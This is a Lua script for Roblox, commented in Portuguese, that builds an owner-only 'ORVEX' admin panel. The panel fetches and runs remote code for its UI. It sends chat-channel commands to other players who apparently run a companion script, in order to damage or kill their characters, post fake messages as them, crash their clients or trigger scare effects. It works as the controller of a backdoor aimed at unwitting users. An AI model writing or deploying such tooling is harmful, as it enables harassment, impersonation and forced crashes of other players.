local DONO_USERID = 2980742903
local Players = game:GetService("Players")
local jogador = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)

if jogador.UserId ~= DONO_USERID then jogador:Kick("Acesso negado.") return end

local clientesAtivos = {}
local usuarioSelecionadoTroll = ""
local textoFakeMensagem = ""

-- Escuta os retornos "new123" disparados apenas pelos scripts legítimos
TextChatService.OnIncomingMessage = function(mensagemObj)
    local texto = mensagemObj.Text
    local remetente = mensagemObj.TextSource
    if texto == "new123" and remetente then
        local playerInstancia = Players:GetPlayerByUserId(remetente.UserId)
        if playerInstancia and playerInstancia ~= jogador then
            clientesAtivos[playerInstancia.Name] = os.clock()
        end
    end
    return nil
end

local function obterListaJogadoresDedicada()
    local lista = {}
    local tempoLimite = os.clock() - 15 -- Janela de tolerância estendida após a verificação manual
    for nome, t in pairs(clientesAtivos) do
        if Players:FindFirstChild(nome) and t > tempoLimite then
            table.insert(lista, nome)
        else
            clientesAtivos[nome] = nil
        end
    end
    if #lista == 0 then return {"Nenhum usuário detectado"} end
    return lista
end

local function enviarComandoRede(cmd, arg, forcarSemAlvo)
    if (usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado") or forcarSemAlvo then
        if canalGeral then
            pcall(function()
                canalGeral:SendAsync(string.format("[ORVEX-CMD] %s | %s", cmd, arg))
            end)
        end
    end
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu"))()
local Window = Rayfield:CreateWindow({Name = "ORVEX | ADMIN PAINEL", Subtitle = "Gerenciamento Otimizado", Theme = "Default"})
local TabMonitor = Window:CreateTab({ Name = "Monitor", Icon = "rbxassetid://100604009889706" })
local TabTroll = Window:CreateTab({ Name = "Troll", Icon = "rbxassetid://10651147057" })

TabMonitor:CreateSection({ Name = "Gerenciamento e Varredura Manual" })
TabMonitor:CreateButton({
    Name = "Verificar Rede (Detectar Usuários)",
    Callback = function()
        enviarComandoRede("SolicitarVerificacao", "true", true)
        Rayfield:Notify({Title = "Varredura", Content = "Sinal de checagem enviado. Aguardando retornos...", Duration = 3})
    end
})

local LabelContador = TabMonitor:CreateText({ Name = "Contador", Text = "Usuários com script ativo: 0" })
local LabelLista = TabMonitor:CreateText({ Name = "Usuários Online", Text = "Aperte em Verificar Rede para escanear." })

local DropdownTroll = TabTroll:CreateDropdown({
    Name = "Selecionar Alvo da Rede",
    Options = obterListaJogadoresDedicada(),
    CurrentOption = "",
    MultipleOptions = false,
    Callback = function(opcao) usuarioSelecionadoTroll = opcao end
})

TabTroll:CreateButton({Name = "Reduzir Vitalidade", Callback = function() enviarComandoRede("Danificar", "25") end})
TabTroll:CreateButton({Name = "Eliminar Personagem", Callback = function() enviarComandoRede("Danificar", "0") end})

TabTroll:CreateInput({Name = "Texto Fake", PlaceholderText = "Escreva aqui...", Callback = function(t) textoFakeMensagem = t end})
TabTroll:CreateButton({Name = "Enviar Mensagem Simulada", Callback = function() enviarComandoRede("FakeMessage", textoFakeMensagem) end})
TabTroll:CreateButton({Name = "Provocar Travamento (Crash)", Callback = function() enviarComandoRede("ForcarCrash", "true") end})
TabTroll:CreateToggle({Name = "Efeito Susto", CurrentValue = false, Callback = function(v) enviarComandoRede("EfeitoSusto", v and "ATIVAR" or "DESATIVAR") end})

task.spawn(function()
    while task.wait(3) do
        pcall(function()
            local ativos = obterListaJogadoresDedicada()
            DropdownTroll:Refresh(ativos)
            if ativos == "Nenhum usuário detectado" then
                LabelContador:Set("Usuários com script ativo: 0")
                LabelLista:Set("Online: Nenhum")
            else
                LabelContador:Set("Usuários com script ativo: " .. #ativos)
                LabelLista:Set("Online: " .. table.concat(ativos, ", "))
            end
        end)
    end
end)
